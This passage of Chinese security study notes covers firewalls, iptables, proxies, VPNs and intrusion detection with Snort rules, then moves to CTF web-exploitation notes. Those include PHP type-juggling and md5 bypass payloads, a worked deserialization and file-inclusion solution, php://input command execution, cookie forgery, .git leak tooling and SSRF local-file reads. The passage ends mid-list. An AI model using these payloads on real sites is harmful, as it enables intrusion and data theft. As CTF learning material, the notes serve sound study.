使用应用代理网关作为双宿主堡垒主机\n\n  –一个使用公网IP地址连接外部网络\n\n  –一个使用私有IP地址连接内部网络\n\n  –由应用代理服务器程序为特定的网络应用提供代理\n\n- 优点：对外屏蔽内网信息、用户级身份认证和行为审计\n\n- 缺点：内网对外访问控制过于严格、堡垒主机安全差、，一旦堡垒主机被攻破，内网也将全面地暴露\n\n{% asset_img 双宿主堡垒.png 双宿主堡垒 %}\n\n##### 13.2.1.6.3 屏蔽主机\n\n- 结合包过滤防火墙和应用层代理\n\n  –两层安全防护\n\n  –包过滤防火墙：网络层的访问控制\n\n  –应用层代理堡垒主机：进行应用安全控制\n\n- 优势：双重安全可靠设计\n\n- 缺点：对外开放服务器成弱点\n\n{% asset_img 屏蔽主机.png 屏蔽主机 %}\n\n##### 13.2.1.6.4 屏蔽子网\n\n- 屏蔽子网：DMZ区\n\n  –应用代理及对外服务器\n\n  –三层安全防护：外网防火墙、应用层代理、内网防火墙\n\n{% asset_img 屏蔽子网.png 屏蔽子网 %}\n\n#### 13.2.1.7 Linux中的开源防火墙\n\n- Netfilter\n\n  –Linux内核中的防火墙模块\n\n  –Netfilter特性\n\n  - 包过滤->状态报文检查\n  - 灵活可扩展框架, 支持NAT网络地址转换, 提供多层API接口以支持第三方扩展\n\n  –Netfilter功能\n\n  - 构建防火墙, NAT共享上网, 利用NAT构建透明代理, 构建QoS或策略路由器, …\n\n- IPTables\n\n  –Linux应用层的防火墙配置工具\n\n  –ipfwadm(2.0.x) -> ipchains(2.2.x) -> iptables(2.4.x/2.6.x)\n\n##### 13.2.1.7.1 Netfilter/iptables的缺省规则表/链\n\n{% asset_img Netfilter iptables的缺省规则表 链.png Netfilter iptables的缺省规则表 链 %}\n\n##### 13.2.1.7.2 Netfilter在Linux协议栈中的hook检查点\n\n- PREROUTING: 进入防火墙数据包, 路由转发前, 实现NAPT/DNAT\n- LOCAL INPUT: 发往本地协议栈的数据包, 实现本地安全防护\n- FORWARD: 经过防火墙转发的数据包, 实现网络流状态过滤\n- LOCAL OUTPUT: 从本地协议栈发出的数据包, 限制对外访问\n- POSTROUTING: 从防火墙发出数据包, 路由转发后, 实现SNAT\n\n{% asset_img hook检查点.png hook检查点 %}\n\n##### 13.2.1.7.3 Netfilter的检查链和处理策略\n\n- Netfilter检查链\n\n  –通过防火墙转发流量: PREROUTINGàFORWARDàPOSTROUTING\n\n  –传入防火墙本机流量: PREROUTINGàINPUT\n\n  –防火墙本机传出流量: OUTPUTàPOSTROUTING\n\n- Netfilter处理策略\n\n  –ACCEPT: 允许数据包经过网络协议栈\n\n  –DROP: 静默地丢弃数据包\n\n  –QUEUE: 通过nf_queue机制将数据包传送至应用层供上层应用处理\n\n  –STOLEN: 保持数据包直到特定条件后处理, 用于处理IP分片等\n\n  –REPEAT: 使得数据包重新进入hook点\n\n##### 13.2.1.7.4 Netfilter的报文状态检查\n\n- 支持的网络连接状态\n\n  –NEW: 新建连接, 连接初始报文或只看到一个方向的数据包\n\n  –ESTABLISHED: 已建连接, 双向通讯\n\n  –RELATED: 相关连接, 用于处理FTP等协商端口的网络协议\n\n  –INVALD: 非法状态\n\n- 实现机制\n\n  –使用hash表等实现CT表, 支持对已记录连接的快速查找\n\n  –在PREROUTING, INPUT, POSTROUTING等hook点上注册callback函数, 用于跟踪网络连接状态\n\n  –支持用户态程序(IPTables)灵活配置各个hook点上的防火墙规则, 对网络连接进行访问控制\n\n##### 13.2.1.7.5 Netfilter防火墙规则过滤 \n\n{% asset_img Netfilter防火墙规则过滤.png Netfilter防火墙规则过滤 %}\n\n##### 13.2.1.7.6 Iptables\n\n- 为用户提供了配置netfilter规则的命令行接口\n\n  –$ iptables[-t table] command [match] [target]\n\n- command-规则配置动作\n\n  –-A(添加)、-D(删除)、-P(缺省策略)、-N(新建链)、-F(清空)、-L(列举)\n\n- match-规则匹配条件\n\n  –通用匹配和特定协议匹配\n\n  –支持“与”关系\n\n- Target-目标操作\n\n  –ACCEPT、DROP、REJECT、RETURN\n\n##### 13.2.1.7.7 Netfilter/iptables的过滤与报文状态检查机制\n\n- 两种策略\n\n  (1) 设置缺省的通行策略为允许(ACCEPT)，然后定义禁止的网络流量和行为；-Bad\n\n  (2) 设置缺省的通行策略为禁止(DROP)，然后定义允许的网络流量和行为；-Good\n\n- 静态包过滤\n\n  –# iptables-t filter -A FORWARD -s 192.168.0.0/24 -d 192.168.1.0/24 -j ACCEPT\n\n- 报文状态检查\n\n  –状态：NEW、ESTABLISHED、RELATED、INVALD\n\n  –# iptables-t filter -A FORWARD -d [WEB_SERVER] -m state --state NEW -j ACCEPT\n\n  –# iptables-t filter -A FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT\n\n##### 13.2.1.7.8 Netfilter/iptables的NAT机制\n\n- NAT机制类型\n\n  –SNAT：源地址/端口NAT\n\n  –DNAT：目的地址/端口NAT\n\n- NAT功能类型\n\n  –IP伪装（masquerading）：属于SNAT\n\n  - #iptables-t nat-A POSTROUTING -ieth1 -o eth0 -j MASQUERADE\n\n  –透明代理（transparent proxying）：属于DNAT\n\n  - #iptables-t nat-A PREROUTING -ieth1 -j DNAT --to 5.6.7.8\n\n  –端口转发（port forwarding）\n\n  - #iptables-A PREROUTING -t nat-p tcp-d 1.2.3.4 --dport8080 -j DNAT --to 192.168.1.1:80\n\n### 13.2.2 代理技术\n\n- 代理(proxy)实际上也是一种安全防护技术\n\n  –允许客户端通过代理与网络服务进行非直接的连接\n\n  –在代理服务器上可以进行访问控制和内容检查\n\n- 不同类型的代理技术\n\n  –应用层：应用层代理(HTTP代理)\n\n  –传输层：电路级代理(Socks代理)\n\n  –网络层：NAT代理(NAT网关、拨号上网路由器)\n\n#### 13.2.2.1 应用层代理\n\n- 应用层代理\n\n  –也称为应用层网关、代理服务器\n\n  –特定应用层网络服务(HTTP/Email…)\n\n  –MSP –Microsoft Proxy Server、Squid\n\n{% asset_img 应用层代理.png 应用层代理 %}\n\n- 应用层代理优势\n\n  –隐藏内部网络信息\n\n  –通讯中转，严格内容审查\n\n  –存储转发机制，在线审计\n\n  –用户级身份认证机制\n\n- 应用层代理不足\n\n  –不通用、不透明、处理速度较慢、部署代价较高\n\n#### 13.2.2.2 电路级代理\n\n- 电路级代理\n\n  –Socks代理\n\n  –工作在传输层\n\n  –同时为多种不同的应用服务提供支持\n\n- 工作机制\n\n  –TCP层中继\n\n  –建立外部连接，并在连接会话间转发数据\n\n- 差异：通用、用户级身份认证，但无法进行细致内容审查\n\n{% asset_img 电路级代理.png 电路级代理 %}\n\n#### 13.2.2.3 NAT代理-网络地址转换\n\n{% asset_img NAT代理.png NAT代理 %}\n\n{% asset_img 网络地址转换.png 网络地址转换 %}\n\n- NAT(网络地址转换)\n\n  –允许多个用户分享少量或单一的IP地址（源NAT）\n\n  –允许将网络服务映射到内部服务网络IP和端口（目的NAT）\n\n- NAT代理优势\n\n  –方便：任意使用私有网段IP地址，无需申请，无冲突\n\n  –安全：对外隐藏内部网络信息\n\n### 13.2.3 VPN\n\n- VPN－虚拟专有网(Virtual Private Network)\n\n  –利用大规模网络(如Internet)上公用链路代替物理链路构建的安全专有网络。\n\n  –大型跨地域企业构建企业网的常用方案。\n\n- VPN类型\n\n  –IPSEC VPN(网络层)\n\n  –SSL VPN(传输层)\n\n- VPN产品\n\n  –国内通常在防火墙上集成\n\n  –专用VPN设备\n\n- 开源VPNOpenVPN\n\n### 13.2.4 内网安全管理\n\n- 70%以上安全事故是由网络内部原因造成的\n\n  –防火墙等边界安全防护不能应对\n\n  –内网安全管理的必要性\n\n- 内网安全管理\n\n  –有效地对内网终端进行安全管理和健康状态监控，从而增强内部网络的安全性\n\n  –终端安全管理\n\n  –终端运维管理\n\n  –终端补丁分发管理\n\n  –系统日志管理\n\n### 13.2.5 内容安全管理(SCM)\n\n- 内容安全管理SCM\n\n  –关注对网络传输内容的安全性检查\n\n- 网络行为监控\n\n  –网络行为监控审计\n\n  –绿色上网\n\n- 防虫墙/防病毒网关\n\n  –防病毒、蠕虫网关\n\n- 垃圾邮件过滤网关\n\n### 13.2.6 边界安全防御发展趋势-UTM&高性能\n\n- “胖”防火墙 转化为 UTM\n\n- UTM－统一威胁管理\n\n- Many features in one box\n\n  –网络访问与控制: 防火墙, …\n\n  –加密与身份认证: VPN, …\n\n  –SCM: 垃圾邮件过滤, 防病毒, IDS/IPS, 上网监管, …\n\n## 13.3 D：检测技术\n\n### 13.3.1 入侵检测系统基本概念\n\n- 入侵检测(Intrusion Detection)\n\n  –入侵检测，顾名思义，就是对入侵行为的检测与发现。\n\n  –入侵检测即为通过对计算机网络或计算机系统中若干关键点信息的收集和分析，从中发现入侵行为的一种安全技术。\n\n- 入侵(Intrusion)\n\n  –一次入侵可被定义为任何尝试破坏信息资源的保密性、完整性或可用性的行为。\n\n- 入侵检测系统(Intrusion Detection System)\n\n  –实现入侵检测技术，专门用于入侵行为发现和处理的软件系统或硬件设备。\n\n- 防火墙VS IDS：门卫 VS 巡逻队\n\n### 13.3.2 入侵检测技术的发展历程\n\n{% asset_img 入侵检测技术的发展历程.png 入侵检测技术的发展历程 %}\n\n#### 13.3.2.1 Denning入侵检测模型\n\n{% asset_img Denning入侵检测模型.png Denning入侵检测模型 %}\n\n#### 13.3.2.2 为什么Gartner说IDS已死\n\n- 入侵检测产品的误报、漏报和对攻击行为缺乏实时响应等问题突出，严重影响了产品发挥实际的作用。\n\n- Gartner认为IDS不能给网络带来附加的安全，反而会增加管理员的困扰，建议用户使用入侵防御系统(Intrusion Prevention System)即IPS来代替IDS。\n\n- Gartner认为只有在线的或基于主机的攻击阻止(实时拦截)才是最有效的入侵防御系统。\n\n#### 13.3.2.3 入侵威胁分类图\n\n- 入侵者分类\n\n  –外部渗透者: 攻破外部访问控制\n\n  –内部渗透者: 假冒者(攻破过程控制),违法者(误用访问), 秘密用户(攻破逻辑控制)\n\n- 检测分析模型\n\n  –误用检测：监视违反特定规则的权限误用行为，违法者检测\n\n  –异常检测：基于统计方法建立用户正常行为轮廓，假冒者检测\n\n{% asset_img 入侵检测分类图.png 入侵检测分类图 %}\n\n#### 13.3.2.4 入侵检测抽象理论模型\n\n{% asset_img 入侵检测抽象理论模型.png 入侵检测抽象理论模型 %}\n\n#### 13.3.2.5 通用入侵检测模型(CIDF)\n\nCIDF（Common Intrusion Detection Framework，通用入侵检测模型）定义了IDS表达检测信息的标准语言以及IDS组件之间的通信协议。符合CIDF规范的IDS可以共享检测信息，相互通信，协同工作，还可以与其它系统配合实施统一的配置响应和恢复策略。\n\nCIDF将一个入侵检测系统分为以下组件：\n\n- 事件产生器（Event generators）：从入侵检测系统外的整个计算环境中获得事件，并以CIDF gidos格式向系统的其他部分提供此事件。事件产生器是所有IDS所需要的，同时也是可以重用的。\n- 事件分析器（Event analyzers）：从其他组件接收gidos，分析得到的数据，并产生新的gidos。如分析器可以是一个轮廓特征引擎。\n- 响应单元（Response units ）：是对分析结果作出作出反应的功能单元，它可以终止进程、重置连接、改变文件属性等，也可以只是简单的报警。\n- 事件数据库（Event databases）：是存放各种中间和最终数据的地方的统称，它可以是复杂的数据库，也可以是简单的文本文件。\n\n{% asset_img CIDF.png CIDF %}\n\n#### 13.3.2.6 入侵检测技术评估指标\n\n- 检测率(True Positive)\n\n  –攻击事件的检出效果：检测出攻击事件数和全部攻击数之比\n\n  –漏报率(false negative) : 攻击事件没有被检测到\n\n- 误报率(False Positive)\n\n  –把正常事件识别为攻击并报警\n\n- 检测率和误报率往往不能同时很好\n\n  –“基调悖论(base-rate fallacy)”\n\n  –实际的IDS的实现总是在检测率和虚警率之间徘徊，检测率高了，虚警率就会提高;同样虚警率降低了，检测率也就会降低。一般地，IDS产品会在两者中取一个折衷，并且能够进行调整，以适应不同的网络环境。\n\n#### 13.3.2.7 IDS准确率评判标准: ROC曲线\n\n- 对比ROC曲线所围成的面积\n\n- 林肯实验室用接收器特性(ROC，Receiver Operating Characteristic)曲线来描述IDS的性能。\n\n  –ROC广泛用于输入不确定的系统的评估。\n\n  –该曲线可以刻画了IDS的检测率与误报率之间的变化关系。\n\n- 根据一个IDS在不同的条件(在允许范围内变化的阈值，例如异常检测系统的报警门限等参数)下的误报率和检测率，分别把误报率和检测率作为横坐标和纵坐标，就可做出对应于该IDS的ROC曲线。\n\n如果一条直线向上，然后向右以45度角延伸，就是一个非常失败的IDS，它毫无用处；相反，ROC曲线下方的区域越大，IDS的准确率越高。\n\n如图所示，IDS B的准确性高于IDS C，类似地，IDS A在所有的IDS中具有最高的准确性。\n\n{% asset_img ROC曲线.png ROC曲线 %}\n\n### 13.3.3 入侵检测技术\n\n- 误用检测(misuse detection)\n\n  –也称为基于特征的检测(signature-based detection)\n\n  –建立起已知攻击的特征库\n\n  –判别当前行为活动是否符合已知的攻击特征\n\n- 异常检测(anomaly detection)\n\n  –也称为基于行为的检测(behavior-based detection)\n\n  –首先建立起系统的正常模式轮廓\n\n  –若实时获得的系统或用户的轮廓值与正常值的差异超出指定的阈值，就进行入侵报警\n\n#### 13.3.3.1 误用检测\n\n- 目前研究工作比较多，并且已经进入实用\n\n  –建立起已有攻击的模式特征库\n\n  –难点在于：如何做到动态更新，自适应\n\n- 常用技术\n\n  –基于简单规则的模式匹配技术\n\n  –基于专家系统的检测技术\n\n  –基于状态转换分析的检测技术\n\n- 攻击特征提取\n\n  –专家提取\n\n  –自动提取方法(研究热点)\n\n##### 13.3.3.1.1 IDA工作原理——模式匹配\n\n- 单模式匹配\n\n  –KMP算法  Knuth-Morris-Pratt\n\n  –BM算法   Boyer-Moore\n\n- 多模式匹配\n\n  –AC算法  Aho-Corasick\n\n  –基于FSA(有限状态机)，对文本串扫描一次就可以找出匹配的所有模式\n\n##### 13.3.3.1.2 正则表达式的匹配\n\n- 正则表达式能够用来描述符合某类句法规则的字符串集，支持描述更为广泛的负载特征，这使得其能够广泛应用于入侵检测/入侵防御、病毒检测、协议识别等系统中。\n\n- 构造正则表达式对应的自动机来解决正则表达式的匹配问题是流行的技术解决手段\n\n  –基于NFA的技术易于实现，占用状态存储空间较少，但匹配速度较慢。\n\n  –基于DFA的技术具有较快的匹配速度，但会引发状态数量呈指数增加。\n\n#### 13.3.3.2 异常检测\n\n- 比较符合安全的概念，但是实现难度较大\n\n  –正常模式的知识库难以建立\n\n  –难以明确划分正常模式和异常模式\n\n- 常用技术\n\n  –统计方法\n\n  –预测模式\n\n  –神经网络\n\n### 13.3.4 入侵检测系统的分类与部署\n\n#### 13.3.4.1 基于网络的入侵检测系统(NIDS)\n\nIDS可以放在防火墙或者网关的后面，以网络嗅探器的形式捕获所有的对内对外的数据包。\n\n{% asset_img NIDS.png NIDS %}\n\n#### 13.3.4.2 基于审计的入侵检测系统(HIDS)\n\n- 安全操作系统必须具备一定的审计功能，并记录相应的安全性日志\n\n- 基于内核\n\n  从操作系统的内核接收数据\n\n- 基于应用\n\n  从正在运行的应用程序中收集数据\n\n{% asset_img HIDS.png HIDS %}\n\n#### 13.3.4.3 分布式入侵检测系统(DIDS)\n\n{% asset_img DIDS.png DIDS %}\n\n#### 13.3.4.4 入侵检测系统的部署位置\n\n- 当实际使用检测系统时，首先面临的问题就是决定应该在系统的什么位置安装检测和分析入侵行为用的感应器Sensor或检测引擎Engine。\n\n  –对于基于主机的IDS，一般来说直接将检测代理安装在受监控的主机系统上。\n\n  –对于基于网络的IDS，情况稍微复杂\n\n- IDS布局\n\n{% asset_img IDS布局.png IDS布局 %}\n\n### 13.3.5 入侵防御系统IPS\n\n- IDS与IPS\n\n  –IDS: 旁路监听，只起到Detection机制\n\n  –侧重低漏报率，造成误报率较高\n\n  –对使用者技术水平要求较高，应急响应及时\n\n- IPS:内联模式，实时处置数据包\n\n  –侧重低误报率（对正常业务不造成影响）\n\n  –高效的处理性能\n\n  –即插即用，无需使用者参与\n\n### 13.3.6 著名的开源入侵检测系统-Snort\n\n#### 13.3.6.1 Snort概述\n\nSnort是一个轻量级网络入侵检测系统，具有实时数据流分析和日志IP 网络数据包的功能，能够进行协议分析和内容搜索匹配，能够检测不同的攻击方式并对攻击进行实时报警。此外Snort 是一个跨平台、开放源代码的免费软件，所以Snort还具有很好的扩展性和可移植性。\n\n#### 13.3.6.2 Snort结构\n\nSnort主要包括四个模块：数据包嗅探器、预处理器、检测引擎和报警输出模块。\n\n{% asset_img Snort工作流程.png Snort工作流程 %}\n\n1. 数据包嗅探器模块\n\n主要用来实现网络数据包捕获和解析的功能。将捕获的网络数据包按照TCP/IP协议族的不同层次进行解析。\n\n2. 预处理器模块\n\n针对可疑行为检查包或者修改包以便检测引擎能对其正确解释，还可以对网络流进行标准化，以便检测引擎能够准确匹配特征。\n\n3. 检测引擎模块\n\n检测引擎模块是入侵检测系统实现的核心，当数据包从预处理器送过来后，检测引擎依据预先设置的规则检查数据包，一旦发现数据包中的内容和某条规则相匹配，就通知报警模块。\n\n4. 报警/日志输出模块\n\n检测引擎检查后的Snort数据需要以某种方式输出。\n\n#### 13.3.6.3 Snort规则结构\n\nSnort采用基于规则的网络入侵模式搜索机制，对网络数据包进行模式匹配，从中发现入侵或恶意攻击行为。\n\nSnort将所有已知的入侵行为以规则的形式存放在规则库中，每一条规则由规则头和规则选项两个部分组成。\n\n规则头定义了规则的动作、所匹配网络报文的协议、源地址、目的地址、源端口及目标端口等信息；规则选项部分则包含了所要显示给用户查看的警告信息以及用来判定报文是否为攻击报文的其他信息。\n\n{% asset_img snort规则结构.jpg snort规则结构 %}\n\nSnort规则头部的主要结构如下所示。\n\n{% asset_img snort规则头部.png snort规则头部 %}\n\n- 动作：当规则与包比对并符合条件时，会采取什么类型的动作。出现通常动作时产生报警或记录日志或向其他规则发出请求。\n- 协议：用来在一个特定协议的包上应用规则。\n- 地址：定义源或目的地址\n- 端口：如果协议是TCP或UDP，端口部分用来确定规则所对应的包的源及目的端口。\n- 方向：确定哪一边的地址和端口是源，哪一边是目的。\n\n例如，下述规则在探测到TTL为100的ICMP ping包时，就会产生报警：\n\n```\nalert icmp any any -> any any (msg: \"Ping with TTL=100\"; ttl: 100;)\n```\n\n括号之前的部分叫做规则头部，括号中的部分叫做规则选项。头部依次包括下面部分：\n\n1. 规则的动作：在这个规则中，动作是alert（报警），就是如果符合下面的条件，就会产生一个报警。如果产生报警，默认的情况下将会记录日志。\n2. 协议：在这个规则中，协议是ICMP，也就是说这条规则仅仅对ICMP包有效，如果一个包的协议不是ICMP， Snort探测引擎就不理会这个包以节省CPU时间。\n3. 源地址和源端口：在这个例子中，它们都被设置成了any，也就是这条规则将被应用在来自任何地方的ICMP包上，当然，端口号与ICMP是没有什么关系的，仅仅和TCP和UDP有关系。\n4. 方向：用→表示从左向右的方向，表示在这个符号的左面部分是源，右面是目的，也表示规则应用在从源到目的的包上。如果是←，那么就相反。注意，也可以用<>来表示规则将应用在所有方向上。\n5. 目的地址和端口：若都是any，则表示规则并不关心它们的目的地址。在这个规则中，由于any的作用，方向段并没有实际的作用，因为它将被应用在所有方向的ICMP包上。\n6. 在括号中的选项部分表示：如果包符合TTL=100的条件就产生一条包含文字“Ping with TTL=100”的报警。TTL是IP数据包头部字段。\n\n#### 13.3.6.4 Snort典型规则示例\n\nSnort规则的本质就是简单模式匹配，即通过对数据包的分析得到所需信息，用以匹配自身的规则库。\n\n在初始化并解析规则时，分别生成四个不同的规则树：TCP、UDP、ICMP和IP，每一个规则树即一个独立的三维链表：规则头（Rule Tree Node，RTN）、规则选项（Optional Tree Node，OTN）和指向匹配函数的指针。\n\n{% asset_img snort规则树.png snort规则树 %}\n\nSnort初始化时，会根据配置文件的要求加载相应的规则。Snort对每条规则进行三次分类：协议分类、源/目标端口分类、内容类别分类。 \n\n## 13.4 R：响应技术\n\n- 计算机及网络取证技术\n\n  –分析攻击并寻找追溯线索\n\n  –保全并提取现场证据：法律执行部门\n\n- 攻击追溯和响应\n\n  –Attacker Trace: very difficult, Step-stone attack\n\n  –以牙还牙, 以暴制暴? –并不可取\n\n- 备份恢复\n\n  –建立良好的关键数据备份习惯\n\n  –RAID冗余磁盘阵列->冷备份->双机热备（保持业务连续性）\n\n- 灾难恢复\n\n  –重要性数据的异地容灾备份：2/5的公司经历大灾难后再也不能恢复运作\n\n# 14. HTTP\n\n## 14.1 抓包关键点\n\n**Referer**\n\nHTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。Referer 常用在防盗链和防恶意请求中。传输referer需要在页面内添加相关的代码。\n\n**User-Agent**\n\n用来传输用户使用的是什么样的浏览器。有些网站为了防止爬虫，会检验User-Agent，只有当是用户访问的时候才会传输数据。\n\n**X-Forwarded-For**\n\nX-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。当今多数缓存服务器的用户为大型ISP，为了通过缓存的方式来降低他们的外部带宽，他们常常通过鼓励或强制用户使用代理服务器来接入互联网。有些情况下，这些代理服务器是透明代理，用户甚至不知道自己正在使用代理上网。\n如果没有XFF或者另外一种相似的技术，所有通过代理服务器的连接只会显示代理服务器的IP地址，而非连接发起的原始IP地址，这样的代理服务器实际上充当了匿名服务提供者的角色，如果连接的原始IP地址不可得，恶意访问的检测与预防的难度将大大增加。\n如果你使用透明代理上网，那么在透明代理发送给服务器端的HTTP请求中会包含x-forward-for信息\n简单来说就是用来传输最原始ip地址的,阻止匿名请求的，但是可以通过抓包来修改。\n\n小常识：网站的目录一般都在/var/www/html/\n\n## 14.2 Tornado框架\n\nTornado框架的附属文件handler.settings中存在cookie_secret\n\n尝试：error?msg={{handler.settings}} \n\n## 14.3 备份文件\n\n备份文件常用的后缀：.rar\t.zip\t.7z\t.tar.gz\t.bak\t.swp\t.txt\t.html\n\n### 14.3.1 vim缓存\n\n在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容。\n\n以 index.php 为例：第一次产生的交换文件名为 `.index.php.swp`\n\n再次意外退出后，将会产生名为 `.index.php.swo` 的交换文件\n\n第三次产生的交换文件则为 `.index.php.swn`\n\n### 14.3.2 .DS_Store文件利用\n\n.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。 (直接在URL里加上`/.DS_Store`)\n\n记事本打开查找文件，放在URL上。\n\n## 14.4 弱类型绕过\n\n```\n==\t\t只要值相等\n===\t\t不仅值相等还要数据类型相同\n```\n\n例1：\n\n```php\n<?php\ninclude_once \"flag.php\";\n\nif(isset($_GET['key'])) {\n    $key = $_GET['key'];\n    if(!is_numeric($key)) {\n        exit(\"Just num!\");\n    }\n    $key = intval($key);\n    $str = \"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3\";\n    if($key == $str) {\t\n        echo $flag;\n    }\n}\nelse {\n    echo \"Try to find out source file!\";\n}\n\n#payload:/?key=123\n```\n\n例2：\n\n```php\nif (isset($_POST['password'])) {\n\t$password = $_POST['password'];\n\tif (is_numeric($password)) {\n\t\techo \"password can't be number</br>\";\n\t}elseif ($password == 404) {\n\t\techo \"Password Right!</br>\";\n\t}\n}\n\n#payload:/?password=404a\n```\n\n例3：md5绕过\n\n```php\n<?php\nerror_reporting(0);\n$a = $_GET['a'];\n$b = $_GET['b'];\n\nif($a != $b && md5($a) == md5($b)){\n    echo \"<script>window.location.replace('./levell14.php')</script>\";\n}\n?>\n```\n\n（1）找出md5值都是两个0e开头的开头的。原理是php里面在做 == 的时候会先把两边的类型转成一样的，因为是0e开头，php会认为它是科学技计数法，而0的多少次方都是0。举例：QNKCDZO、s155964671a、s1091221200a。\n\n（2）数组绕过。原理是md5等函数不能处理数组，导致函数返回Null。而Null是等于Null的，导致了绕过。 举例：a[]=1&b[]=2。做===的时候只能用数组绕过。\n\n## 14.5 序列号与反序列化\n\n```php\nserialize()\t\t序列化\nunserialize()\t反序列化\n\nO:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)}\n\nO:4:“Flag”:1:{s:4:“file”;s:8:“flag.php”;}\n```\n\n## 14.6 伪协议\n\n```\nphp://filter用于读取源码\n用法：php://filter/read=convert.base64-encode/resource=xxx\n\nphp://input用于执行php代码，需要POST请求提交数据\n\ndata://text/plain用于数据流的读取，如果传入的数据是php代码，就会执行代码\n用法：data://text/plain;base64,xxxx(base64编码后的数据)\n\nfile://用于访问本地文件系统\n用法：file://[文件的绝对路径]\n```\n\n### 14.6.1 data://text/plain\n\n条件\n\nallow_url_fopen: on\n\nallow_url_include: on\n\n例：[ZJCTF 2019]NiZhuanSiWei 1\n\n```php\n<?php  \n$text = $_GET[\"text\"];\n$file = $_GET[\"file\"];\n$password = $_GET[\"password\"];\nif(isset($text)&&(file_get_contents($text,'r')===\"welcome to the zjctf\")){\n    echo \"<br><h1>\".file_get_contents($text,'r').\"</h1></br>\";\n    if(preg_match(\"/flag/\",$file)){\n        echo \"Not now!\";\n        exit(); \n    }else{\n        include($file);  //useless.php\n        $password = unserialize($password);\n        echo $password;\n    }\n}\nelse{\n    highlight_file(__FILE__);\n}\n?>\n```\n\n要从URL中输入参数text,file和password。\n\ndata://text/plain用于数据流的读取，我们用data伪协议读出text里的内容。 一般为了绕过某些过滤都会用到base64，这里没有过滤所以可以不用。\n\n```\ndata://text/plain,welcome to the zjctf\ndata://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=\n```\n\npreg_match()是执行匹配正则表达式，只要文件中有出现flag字眼，都会被过滤。此php文件还包含另一个php文件useless.php，利用php://filter来进行读取php文件，而不能直接用file=useless.php读取。\n\n```\nphp://filter/read=convert.base64-encode/resource=useless.php\n```\n\npayload：\n\n```\n/?text=data://text/plain,welcome to the zjctf&file=php://filter/read=convert.base64-encode/resource=useless.php\n```\n\n读取后会出现类似于乱码的东西，但其实那是base64编码，拿去解码，解出下面代码：\n\n```php\n<?php  \n\nclass Flag{  //flag.php  \n    public $file;  \n    public function __tostring(){  \n        if(isset($this->file)){  \n            echo file_get_contents($this->file); \n            echo \"<br>\";\n        return (\"U R SO CLOSE !///COME ON PLZ\");\n        }  \n    }  \n}  \n?> \n```\n\n这里提示我们有个flag.php文件，我们直接就将变量file等于这个文件，构造一下\n\n```php\n<?php  \n\nclass Flag{  //flag.php  \n    public $file='flag.php';  \n    public function __tostring(){  \n        if(isset($this->file)){  \n            echo file_get_contents($this->file); \n            echo \"<br>\";\n        return (\"U R SO CLOSE !///COME ON PLZ\");\n        }  \n    }  \n}\n$a = new Flag();\necho serialize($a);\n?> \n//O:4:\"Flag\":1:{s:4:\"file\";s:8:\"flag.php\";}\n```\n\n这里有个问题是为什么要序列化输出变量a呢，可能是因为在存password之前把password反序列化了，即我们存进去的密码不是我们输入的密码，而是将密码反序列化后的一串东西。所以我们要得到我们输入的密码就必须将存进去的密码序列化回来。\n\n完整payload：\n\n```\n/?text=data://text/plain,welcome to the zjctf&file=useless.php&password=O:4:\"Flag\":1:{s:4:\"file\";s:8:\"flag.php\";}\n```\n\n### 14.6.2 php://input\n\nphp://input要求`allow_url_include`设置为`On`，所以得看看phpinfo()中的`allow_url_include`是否为`On`。\n\n然后用burpsuite抓包，发送到repeater里去，将第一行设置为\n\n```\nGET /?file=php://input HTTP/1.1\n```\n\n在最下面设置为\n\n```php\n#<?php system(\"ls /\"); ?>\tsend,返回目录\n<?php system(\"cat /falg_19485\");?>\tsend,返回flag\n```\n\n### 14.6.3 php://filter\n\n参考如下：\n\n```\nhttps://writeup.ctfhub.com/Skill/Web/RCE/366Ttyc8tGBiCyo54pR8YR.html\n```\n\n## 14.7 请求方式\n\n请求方式可以自定义。\n\n```\nGET /index.php HTTP/1.1\nCTFHUB /index.php HTTP/1.1\n```\n\n## 14.8 302跳转\n\n302跳转将包发送到repeater模块查看响应包，因为在HTTP history模块里好像看不到响应包。\n\n查看源代码链接指向index.php，然而在URL上看跳转到了index.html，所以发生了302跳转。\n\n## 14.9 Cookie\n\ncookie伪造，欺骗。直接在cookie管理器里修改。比如admin=0改为admin=1\n\n## 14.10 基本认证\n\n在HTTP中对于基础认证的一些知识，要求使用爆破的方法来获得基础认证的账号密码，之后登陆获得flag。\n\n如何在burpsuite构造payload：\n\nhttps://writeup.ctfhub.com/Skill/Web/Web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD/HTTP%E5%8D%8F%E8%AE%AE/3mSzAzbGydVT74nsq1gcVj.html\n\n# 15. 信息泄露\n\n## 15.1 Git泄露\n\n当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。 \n\n### 15.1.1 Log\n\nGithack：.git泄露利用工具，可还原历史版本。\n\n使用方法：\n\n```\npython GitHack.py http://www.example.com/.git/\n```\n\n### 15.1.2 Stash\n\n### 15.1.3 Index\n\n## 15.2 SVN泄露\n\n## 15.3 HG泄露\n\n# 16. 服务端请求伪造(SSRF)\n\n## 16.1 内网访问\n\n```\nhttp://xxxx/?url=127.0.0.1/flag.php\n```\n\n小知识点，file://可以查看源码，前提要知道路径。这也是表示有SSRF漏洞的关键点。\n\n```\n?url=file:///var/www/html/flag.php\n```\n\n## 16.2 伪协议读取文件\n\n了解伪协议：https://www.cnblogs.com/-mo-/p/11673190.html\n\n```\nfile:// – 本地文件传输协议，主要用于访问本地计算机中的文件。\n\ndict:// – 字典服务器协议，dict是基于查询相应的TCP协议。\n\nsftp:// – SSH文件传输协议或安全文件传输协议（Secure File Transfer Protocol）是一种简单的基于lockstep机制的文件传输协议，允许客户端从远程主机获取文件或将文件上传至远程主机。\n\nldap:// – 